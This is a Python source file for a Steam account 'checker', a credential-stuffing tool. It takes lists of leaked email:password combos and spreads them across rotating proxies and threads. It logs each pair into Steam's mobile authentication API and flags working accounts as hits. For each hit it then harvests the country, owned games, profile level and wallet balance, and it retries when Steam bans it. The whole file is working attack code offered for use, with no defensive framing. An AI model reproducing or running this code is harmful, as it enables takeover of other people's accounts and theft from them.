# checkers/steam.py
import requests
import base64
import json
import os
import sys
import re
import time
import random
import struct
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

class SteamChecker:
    # ===== MAPA DE PAÍSES =====
    COUNTRY_MAP = {
        "AF": "Afghanistan", "AX": "Aland Islands", "AL": "Albania", "DZ": "Algeria",
        "AS": "American Samoa", "AD": "Andorra", "AO": "Angola", "AI": "Anguilla",
        "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia", "AW": "Aruba",
        "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas",
        "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
        "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BM": "Bermuda",
        "BT": "Bhutan", "BO": "Bolivia", "BA": "Bosnia and Herzegovina", "BW": "Botswana",
        "BR": "Brazil", "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso",
        "BI": "Burundi", "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada",
        "CV": "Cape Verde", "KY": "Cayman Islands", "CF": "Central African Republic",
        "TD": "Chad", "CL": "Chile", "CN": "China", "CO": "Colombia",
        "KM": "Comoros", "CG": "Congo", "CD": "DR Congo", "CK": "Cook Islands",
        "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba",
        "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
        "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
        "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
        "EE": "Estonia", "ET": "Ethiopia", "FK": "Falkland Islands", "FO": "Faroe Islands",
        "FJ": "Fiji", "FI": "Finland", "FR": "France", "GF": "French Guiana",
        "PF": "French Polynesia", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
        "DE": "Germany", "GH": "Ghana", "GI": "Gibraltar", "GR": "Greece",
        "GL": "Greenland", "GD": "Grenada", "GP": "Guadeloupe", "GU": "Guam",
        "GT": "Guatemala", "GG": "Guernsey", "GN": "Guinea", "GW": "Guinea-Bissau",
        "GY": "Guyana", "HT": "Haiti", "VA": "Vatican", "HN": "Honduras",
        "HK": "Hong Kong", "HU": "Hungary", "IS": "Iceland", "IN": "India",
        "ID": "Indonesia", "IR": "Iran", "IQ": "Iraq", "IE": "Ireland",
        "IM": "Isle of Man", "IL": "Israel", "IT": "Italy", "JM": "Jamaica",
        "JP": "Japan", "JE": "Jersey", "JO": "Jordan", "KZ": "Kazakhstan",
        "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea",
        "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
        "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya",
        "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
        "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia",
        "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
        "MQ": "Martinique", "MR": "Mauritania", "MU": "Mauritius", "YT": "Mayotte",
        "MX": "Mexico", "FM": "Micronesia", "MD": "Moldova", "MC": "Monaco",
        "MN": "Mongolia", "ME": "Montenegro", "MS": "Montserrat", "MA": "Morocco",
        "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia", "NR": "Nauru",
        "NP": "Nepal", "NL": "Netherlands", "NC": "New Caledonia", "NZ": "New Zealand",
        "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NU": "Niue",
        "NF": "Norfolk Island", "MP": "N. Mariana Islands", "NO": "Norway", "OM": "Oman",
        "PK": "Pakistan", "PW": "Palau", "PS": "Palestine", "PA": "Panama",
        "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru", "PH": "Philippines",
        "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico", "QA": "Qatar",
        "RE": "Reunion", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
        "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
        "SL": "Sierra Leone", "SG": "Singapore", "SX": "Sint Maarten", "SK": "Slovakia",
        "SI": "Slovenia", "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa",
        "SS": "South Sudan", "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan",
        "SR": "Suriname", "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland",
        "SY": "Syria", "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania",
        "TH": "Thailand", "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga",
        "TT": "Trinidad and Tobago", "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan",
        "TC": "Turks and Caicos", "TV": "Tuvalu", "UG": "Uganda", "UA": "Ukraine",
        "AE": "UAE", "GB": "United Kingdom", "US": "United States", "UY": "Uruguay",
        "UZ": "Uzbekistan", "VU": "Vanuatu", "VE": "Venezuela", "VN": "Vietnam",
        "VG": "British Virgin Islands", "VI": "US Virgin Islands", "WF": "Wallis and Futuna",
        "EH": "Western Sahara", "YE": "Yemen", "ZM": "Zambia", "ZW": "Zimbabwe",
    }

    # ===== PROTOBUF UTILS =====
    @staticmethod
    def _varint_encode(v):
        """Codifica un entero en formato varint"""
        if v < 0:
            v &= 0xffffffffffffffff
        buf = bytearray()
        while v > 0x7f:
            buf.append(0x80 | (v & 0x7f))
            v >>= 7
        buf.append(v & 0x7f)
        return bytes(buf)

    @staticmethod
    def _varint_decode(data, pos):
        """Decodifica un varint"""
        result = 0
        shift = 0
        while pos < len(data):
            byte = data[pos]
            pos += 1
            result |= (byte & 0x7f) << shift
            if not (byte & 0x80):
                break
            shift += 7
        return result, pos

    @staticmethod
    def _protobuf_string(field, value):
        """Crea un campo protobuf de tipo string"""
        if isinstance(value, str):
            value = value.encode()
        return SteamChecker._varint_encode((field << 3) | 2) + SteamChecker._varint_encode(len(value)) + value

    @staticmethod
    def _protobuf_bytes(field, value):
        """Crea un campo protobuf de tipo bytes"""
        return SteamChecker._varint_encode((field << 3) | 2) + SteamChecker._varint_encode(len(value)) + value

    @staticmethod
    def _protobuf_int(field, value):
        """Crea un campo protobuf de tipo int"""
        return SteamChecker._varint_encode(field << 3) + SteamChecker._varint_encode(value if value >= 0 else value & 0xffffffffffffffff)

    @staticmethod
    def _protobuf_parse(raw):
        """Parsea un mensaje protobuf"""
        result = {}
        pos = 0
        while pos < len(raw):
            try:
                tag, pos = SteamChecker._varint_decode(raw, pos)
            except:
                break
            field = tag >> 3
            wire_type = tag & 7
            if field < 1:
                break
            if wire_type == 0:
                value, pos = SteamChecker._varint_decode(raw, pos)
                prev = result.get(field)
                if prev is not None:
                    result[field] = [prev, value] if not isinstance(prev, list) else prev + [value]
                else:
                    result[field] = value
            elif wire_type == 2:
                length, pos = SteamChecker._varint_decode(raw, pos)
                if pos + length > len(raw):
                    break
                chunk = raw[pos:pos + length]
                pos += length
                prev = result.get(field)
                if prev is not None:
                    result[field] = [prev, chunk] if not isinstance(prev, list) else prev + [chunk]
                else:
                    result[field] = chunk
            elif wire_type == 5:
                if pos + 4 > len(raw):
                    break
                result[field] = struct.unpack_from('<I', raw, pos)[0]
                pos += 4
            elif wire_type == 1:
                if pos + 8 > len(raw):
                    break
                result[field] = struct.unpack_from('<Q', raw, pos)[0]
                pos += 8
            else:
                break
        return result

    @staticmethod
    def _rsa_encrypt(password, mod, exp):
        """Encripta la contraseña con RSA"""
        mod_bytes = bytes.fromhex(mod)
        n = int.from_bytes(mod_bytes, 'big')
        e = int(exp, 16)
        key_len = len(mod_bytes)
        fill = key_len - len(password) - 3
        pad = bytes(random.randint(1, 255) for _ in range(fill))
        block = b'\x00\x02' + pad + b'\x00' + password.encode()
        m = int.from_bytes(block, 'big')
        c = pow(m, e, n)
        return base64.b64encode(c.to_bytes(key_len, 'big')).decode()

    @staticmethod
    def _format_proxy(proxy):
        """Formatea el proxy para requests"""
        if not proxy:
            return None
        proxy = proxy.strip()
        if proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            return proxy
        parts = proxy.split(":")
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        return f"http://{proxy}"

    @staticmethod
    def check(email: str, password: str, proxy: str = None) -> dict:
        """Verifica una cuenta de Steam"""
        session = requests.Session()
        session.headers.update({
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "User-Agent": "okhttp/4.9.2",
        })
        session.headers["Cookie"] = "Steam_Language=english"

        proxy_url = SteamChecker._format_proxy(proxy)
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
            session.verify = False

        try:
            # ===== PASO 1: OBTENER RSA KEY =====
            pb = SteamChecker._protobuf_string(1, email)
            enc = urllib.parse.quote(base64.b64encode(pb).decode())

            r = session.get(
                "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
                f"?origin=SteamMobile&input_protobuf_encoded={enc}",
                timeout=15
            )

            if r.status_code != 200:
                return {"status": "ERROR", "email": email, "password": password, "error": f"RSA:{r.status_code}"}

            rsa_data = SteamChecker._protobuf_parse(r.content)
            mod = rsa_data.get(1, b"")
            exp = rsa_data.get(2, b"")
            timestamp = rsa_data.get(3, 0)

            if isinstance(mod, bytes):
                mod = mod.decode()
            if isinstance(exp, bytes):
                exp = exp.decode()

            if not mod or not exp:
                return {"status": "ERROR", "email": email, "password": password, "error": "RSA key empty"}

            # ===== PASO 2: ENCRIPTAR CONTRASEÑA =====
            encrypted_pw = SteamChecker._rsa_encrypt(password, mod, exp)

            # ===== PASO 3: ENVIAR AUTENTICACIÓN =====
            device = (
                SteamChecker._protobuf_string(1, "SM-S256B") +
                SteamChecker._protobuf_int(2, 3) +
                SteamChecker._protobuf_int(3, -500) +
                SteamChecker._protobuf_int(4, 1)
            )

            auth = (
                SteamChecker._protobuf_string(2, email) +
                SteamChecker._protobuf_string(3, encrypted_pw) +
                SteamChecker._protobuf_int(4, timestamp) +
                SteamChecker._protobuf_int(5, 1) +
                SteamChecker._protobuf_int(7, 1) +
                SteamChecker._protobuf_string(8, "Mobile") +
                SteamChecker._protobuf_bytes(9, device) +
                SteamChecker._protobuf_int(11, 0)
            )

            auth_b64 = base64.b64encode(auth).decode()

            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            content_type = f"multipart/form-data; boundary={boundary}"
            
            body = (
                f"------{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"input_protobuf_encoded\"\r\n\r\n"
                f"{auth_b64}\r\n"
                f"------{boundary}--\r\n"
            ).encode()

            r = session.post(
                "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1",
                data=body,
                headers={"Content-Type": content_type},
                timeout=15
            )

            # ===== VERIFICAR RESULTADO =====
            try:
                eresult = int(r.headers.get("X-eresult", "0"))
            except:
                eresult = 0

            if eresult in (5, 2):
                return {"status": "INVALID", "email": email, "password": password}
            if eresult in (63, 43):
                return {"status": "BANNED", "email": email, "password": password}
            if eresult != 1:
                return {"status": "ERROR", "email": email, "password": password, "error": f"eresult={eresult}"}

            # ===== PASO 4: PROCESAR RESPUESTA =====
            auth_response = SteamChecker._protobuf_parse(r.content)
            client_id = auth_response.get(1, 0)
            request_id = auth_response.get(2, b"")
            steam_id = auth_response.get(5, 0)

            # ===== VERIFICAR 2FA =====
            configs = auth_response.get(4, [])
            if isinstance(configs, bytes):
                configs = [configs]
            elif not isinstance(configs, list):
                configs = []

            types = []
            for cfg in configs:
                if isinstance(cfg, bytes):
                    parsed = SteamChecker._protobuf_parse(cfg)
                    t = parsed.get(1, 0)
                    if isinstance(t, list):
                        types.extend(t)
                    else:
                        types.append(t)

            has_2fa = any(t in (2, 3, 4, 5, 6) for t in types)

            if has_2fa:
                return {
                    "status": "2FA",
                    "email": email,
                    "password": password,
                    "steam_id": str(steam_id),
                    "types": ",".join(str(t) for t in types)
                }

            # ===== PASO 5: POLL AUTH =====
            poll = (
                SteamChecker._protobuf_int(1, client_id) +
                SteamChecker._protobuf_bytes(2, request_id)
            )
            poll_b64 = base64.b64encode(poll).decode()

            r = session.post(
                "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1",
                data=(
                    f"------{boundary}\r\n"
                    f"Content-Disposition: form-data; name=\"input_protobuf_encoded\"\r\n\r\n"
                    f"{poll_b64}\r\n"
                    f"------{boundary}--\r\n"
                ).encode(),
                headers={"Content-Type": content_type, "Accept-Encoding": "identity"},
                timeout=15
            )

            poll_data = SteamChecker._protobuf_parse(r.content)
            token = poll_data.get(4, b"")
            if isinstance(token, bytes):
                token = token.decode("utf-8", errors="ignore")

            if not token:
                return {"status": "ERROR", "email": email, "password": password, "error": "No token"}

            # ===== PASO 6: DECODIFICAR JWT =====
            parts = token.split(".")
            if len(parts) < 2:
                return {"status": "ERROR", "email": email, "password": password, "error": "Bad JWT"}

            payload = parts[1]
            rem = len(payload) % 4
            if rem:
                payload += "=" * (4 - rem)

            try:
                jwt_data = json.loads(base64.urlsafe_b64decode(payload))
            except:
                jwt_data = {}

            steam_id_str = str(jwt_data.get("sub", steam_id))
            steam_id_int = int(steam_id_str)

            # ===== PASO 7: OBTENER DATOS DE LA CUENTA =====
            cookie = (
                f"Steam_Language=english; "
                f"steamLoginSecure={steam_id_str}%7C%7C{urllib.parse.quote(token)}; "
                f"mobileClient=android; mobileClientVersion=777777 3.10.9"
            )

            result = {
                "status": "HIT",
                "email": email,
                "password": password,
                "steam_id": steam_id_str,
                "country": "",
                "country_code": "",
                "level": "",
                "games": 0,
                "balance": "",
                "game_list": [],
                "is_premium": True
            }

            # ===== OBTENER PAÍS =====
            try:
                cp_byte = struct.pack('<BQ', 0x09, steam_id_int)
                r = session.post(
                    f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
                    f"?access_token={token}&spoof_steamid=",
                    data=(
                        f"------{boundary}\r\n"
                        f"Content-Disposition: form-data; name=\"input_protobuf_encoded\"\r\n\r\n"
                        f"{base64.b64encode(cp_byte).decode()}\r\n"
                        f"------{boundary}--\r\n"
                    ).encode(),
                    headers={"Content-Type": content_type},
                    timeout=10
                )
                country_data = SteamChecker._protobuf_parse(r.content)
                cc = country_data.get(1, b"")
                if isinstance(cc, bytes):
                    cc = cc.decode()
                result["country_code"] = cc
                result["country"] = SteamChecker.COUNTRY_MAP.get(cc, cc)
            except:
                pass

            # ===== OBTENER JUEGOS =====
            try:
                games_pb = (
                    SteamChecker._protobuf_int(1, steam_id_int) +
                    SteamChecker._protobuf_int(2, 1) +
                    SteamChecker._protobuf_int(3, 1) +
                    SteamChecker._protobuf_int(6, 0) +
                    SteamChecker._protobuf_string(7, "english") +
                    SteamChecker._protobuf_int(8, 1)
                )
                games_b64 = urllib.parse.quote(base64.b64encode(games_pb).decode())
                
                session.headers["Cookie"] = cookie
                r = session.get(
                    f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
                    f"?access_token={token}&spoof_steamid=&origin=SteamMobile"
                    f"&input_protobuf_encoded={games_b64}",
                    timeout=10
                )
                
                games_data = SteamChecker._protobuf_parse(r.content)
                result["games"] = games_data.get(1, 0)
                
                raw_games = games_data.get(2, [])
                if isinstance(raw_games, bytes):
                    raw_games = [raw_games]
                elif not isinstance(raw_games, list):
                    raw_games = []
                
                game_names = []
                for g in raw_games:
                    try:
                        if not isinstance(g, bytes):
                            continue
                        gf = SteamChecker._protobuf_parse(g)
                        name = gf.get(2, b"")
                        if isinstance(name, bytes):
                            name = name.decode(errors="replace")
                        if isinstance(name, str) and name.strip():
                            game_names.append(name.strip())
                    except:
                        continue
                result["game_list"] = game_names
            except:
                pass

            # ===== OBTENER NIVEL =====
            try:
                mp_id = steam_id_int - 76561197960265728
                session.headers["Cookie"] = cookie
                r = session.get(f"https://steamcommunity.com/miniprofile/{mp_id}/json", timeout=10)
                try:
                    mp_data = r.json()
                    level = mp_data.get("level", mp_data.get("player_level", ""))
                    result["level"] = str(level) if level != "" else ""
                except:
                    match = re.search(r'friendPlayerLevel\s+(\S+)', r.text)
                    if match:
                        result["level"] = match.group(1)
            except:
                pass

            # ===== OBTENER WALLET =====
            try:
                r = session.post(
                    f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                    f"?access_token={token}&spoof_steamid=",
                    data=(
                        f"------{boundary}\r\n"
                        f"Content-Disposition: form-data; name=\"input_protobuf_encoded\"\r\n\r\n"
                        f"GAE=\r\n"
                        f"------{boundary}--\r\n"
                    ).encode(),
                    headers={"Content-Type": content_type},
                    timeout=10
                )
                wallet_data = SteamChecker._protobuf_parse(r.content)
                balance = wallet_data.get(14, b"")
                if isinstance(balance, bytes):
                    balance = balance.decode("utf-8", errors="ignore")
                elif isinstance(balance, int):
                    balance = str(balance)
                result["balance"] = balance
            except:
                pass

            return result

        except requests.exceptions.ProxyError:
            return {"status": "ERROR", "email": email, "password": password, "error": "Proxy dead"}
        except requests.exceptions.Timeout:
            return {"status": "ERROR", "email": email, "password": password, "error": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "ERROR", "email": email, "password": password, "error": "Connection failed"}
        except Exception as e:
            return {"status": "ERROR", "email": email, "password": password, "error": str(e)[:80]}

    @staticmethod
    def check_with_retry(email: str, password: str, proxy: str = None, retries: int = 2) -> dict:
        """Verifica con reintentos en caso de BAN"""
        for attempt in range(retries + 1):
            result = SteamChecker.check(email, password, proxy)
            if result.get("status") != "BANNED":
                return result
            if attempt < retries:
                time.sleep(3 + random.random() * 2)
        return result

    @staticmethod
    def process_batch(combos: list, proxies: list = None, threads: int = 10) -> list:
        """Procesa un lote de combos con threads"""
        results = []
        stats = {"hit": 0, "2fa": 0, "bad": 0, "banned": 0, "free": 0, "error": 0, "total": len(combos)}
        
        proxy_index = 0
        proxy_lock = Lock()
        result_lock = Lock()
        
        def get_next_proxy():
            nonlocal proxy_index
            if not proxies:
                return None
            with proxy_lock:
                proxy = proxies[proxy_index % len(proxies)]
                proxy_index += 1
                return proxy
        
        def check_combo(combo):
            email, password = combo
            proxy = get_next_proxy()
            return SteamChecker.check_with_retry(email, password, proxy)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_combo, combo): combo for combo in combos}
            for future in as_completed(futures):
                result = future.result()
                with result_lock:
                    results.append(result)
                    
                    status = result.get("status", "ERROR")
                    if status == "HIT":
                        stats["hit"] += 1
                    elif status == "2FA":
                        stats["2fa"] += 1
                    elif status == "BANNED":
                        stats["banned"] += 1
                    elif status == "INVALID":
                        stats["bad"] += 1
                    elif status == "FREE":
                        stats["free"] += 1
                    else:
                        stats["error"] += 1
        
        return results, stats